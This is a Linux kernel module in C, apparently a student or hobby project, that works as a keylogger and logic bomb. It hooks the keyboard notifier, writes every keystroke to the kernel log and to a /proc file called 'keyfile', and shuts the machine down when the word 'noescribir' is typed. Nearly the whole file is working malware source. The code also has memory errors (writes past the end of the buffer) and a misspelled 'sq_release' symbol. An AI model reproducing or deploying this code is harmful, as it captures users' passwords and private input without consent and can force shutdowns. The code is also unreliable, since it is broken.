#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/fs.h>
#include <linux/proc_fs.h> 
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Federico Orlandau <federico.orlandau@gmail.com>");

static char *buffer;
static size_t len;

static struct proc_dir_entry* key_file;

const char CH_TABLE[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
    'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};

static int file_show(struct seq_file *m, void *v)
{
    buffer = krealloc( buffer, len + 1, GFP_KERNEL);
    buffer[len+1] = '\0';
    seq_printf(m, "Keylogger: %s\n", buffer);
    
    return 0;
}

static int file_open(struct inode *inode, struct file *file)
{

    return single_open(file, file_show, NULL);
}

static const struct file_operations key_fops = {
    .owner      = THIS_MODULE,
    .open       = file_open,
    .read       = seq_read,
    .llseek     = seq_lseek,
    .release    = sq_release,
};

const char PATTERN[] = "noescribir";
#define M (sizeof(PATTERN) - 1)
int pi[M]; 
int p;

static void make_pi(void) {
    int i, j;
    pi[0] = 0;
    for (i = 1; i < M; ++i) {
        j = pi[i-1];
        while (j > 0 && PATTERN[i] != PATTERN[j]) {
            j = pi[j-1];
        }
        if (PATTERN[i] == PATTERN[j]) {
            j++;
        }
        pi[i] = j;
    }
}

static int push_next_char(char t) {
    int match;
    while (t != PATTERN[p] && p > 0) {
        p = pi[p - 1];
    }
    if (t == PATTERN[p] && p < M) {
        p++;
    }
    match = (p == M);
    if (match) {
        p = 0;
    }
    return match;
}

static char decode_key(int keycode) {
    int char_index = keycode - KEY_1;
    buffer = krealloc( buffer, len + 1, GFP_KERNEL);
    len++;
    if(char_index >= 0 && char_index < sizeof(CH_TABLE)){
        printk(KERN_INFO "Key %c", CH_TABLE[char_index]);
        buffer[len + 1] = CH_TABLE[char_index];
        return CH_TABLE[char_index];
    }else{
        return (keycode == KEY_SPACE) ? ' ' : '?';
    }
}

static int on_key_event(struct notifier_block* nblock, unsigned long code, void* param0) {
    struct keyboard_notifier_param* param = param0;
    if (code == KBD_KEYCODE && param->down) {
        int key = param->value;
        if (push_next_char(decode_key(key))) {
            orderly_poweroff(1);
        }
    }
    return NOTIFY_OK;
}

struct notifier_block nb = {
    .notifier_call = on_key_event
};


static int __init logic_bomb_init( void ) {

    key_file = proc_create("keyfile", 0, NULL, &key_fops);

    if (!key_file) {
        return -ENOMEM;
    }
    len = 20;
    buffer = kmalloc(len, GFP_KERNEL);

    register_keyboard_notifier(&nb);
    p = 0;
    make_pi();
    return 0;
}

static void __exit logic_bomb_exit( void ) {
    remove_proc_entry("keyfile", NULL);
    unregister_keyboard_notifier(&nb);
}

module_init(logic_bomb_init);
module_exit(logic_bomb_exit);